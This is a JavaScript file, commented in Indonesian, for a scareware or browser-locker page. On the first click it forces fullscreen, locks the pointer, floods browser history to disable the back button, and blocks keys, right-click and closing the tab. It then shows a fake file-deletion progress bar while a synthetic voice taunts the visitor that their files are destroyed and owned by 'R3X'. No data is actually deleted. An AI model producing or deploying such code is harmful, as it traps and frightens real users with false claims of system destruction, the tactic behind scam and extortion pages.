/* X3-R3X CORE ENGINE V2.5 
   STATUS: LOCKDOWN ACTIVE
*/

let synth = window.speechSynthesis;
let isRunning = false;

// Fungsi Suara Hacker
function speak(msg) {
    let u = new SpeechSynthesisUtterance(msg);
    u.lang = 'id-ID'; 
    u.pitch = 0.2; // Suara berat
    u.rate = 0.7;  // Ngomong pelan biar serem
    synth.speak(u);
}

// Protokol Utama
function initX3Protocol() {
    if (isRunning) return;
    isRunning = true;

    // 1. Masuk Fullscreen & Lock Kursor
    let d = document.documentElement;
    if (d.requestFullscreen) d.requestFullscreen();
    if (d.requestPointerLock) d.requestPointerLock();

    // 2. Aktifkan Visual & Tameng Klik
    document.getElementById('iron-lockdown').style.display = 'block';
    document.getElementById('viewport').classList.add('shaking');

    // 3. Suara Pembuka
    speak("Sistem lo sampah. Semua file sekarang milik R3X. Jangan coba kabur atau gue hancurin total.");

    // 4. ANTI-BACK: Banjiri History (History Flooding)
    for (let i = 0; i < 100; i++) {
        window.history.pushState(null, "", window.location.href);
    }
    window.onpopstate = function() {
        window.history.pushState(null, "", window.location.href);
        speak("Gak ada jalan keluar, tikus kecil.");
        alert("CRITICAL ERROR: R3X KERNEL BLOCKING NAVIGATION!");
    };

    // 5. Fake Deletion Progress (Progress Bar Palsu)
    let p = 0;
    let timer = setInterval(() => {
        if (p < 100) {
            p += Math.floor(Math.random() * 4);
            if (p > 100) p = 100;
            document.getElementById('percent').innerText = p + "% DESTROYED";
        } else {
            clearInterval(timer);
            document.getElementById('status').innerText = "SYSTEM WIPED";
            document.getElementById('status').style.color = "#f00";
            speak("Semua data lo sudah hangus. Terima kasih atas kerjasamanya.");
        }
    }, 400);

    // 6. Loop Ejekan Suara (Looping tiap 10 detik)
    setInterval(() => {
        let darkQuotes = [
            "R3X sedang memantau lo.",
            "Jangan panik, itu cuma file penting lo yang hilang.",
            "Sistem lo sudah mati.",
            "Gak usah tekan tombol itu, gak guna.",
            "Lo cuma target sepele buat X3."
        ];
        speak(darkQuotes[Math.floor(Math.random() * darkQuotes.length)]);
    }, 10000);

    // 7. Proteksi Keyboard & Browser
    document.onkeydown = function(e) { return false; };
    document.addEventListener('contextmenu', e => e.preventDefault());
    window.onbeforeunload = function() { return "DATA SEDANG DIHANCURKAN!"; };
}

// Fungsi Khusus Buat Lo (R3X) buat Matiin
function r3xOverride(e) {
    e.stopPropagation();
    synth.cancel();
    window.onbeforeunload = null;
    alert("R3X AUTHENTICATED. RECOVERING SYSTEM...");
    location.href = "https://www.google.com";
}

// Trigger awal saat layar diklik pertama kali
document.body.addEventListener('click', initX3Protocol);
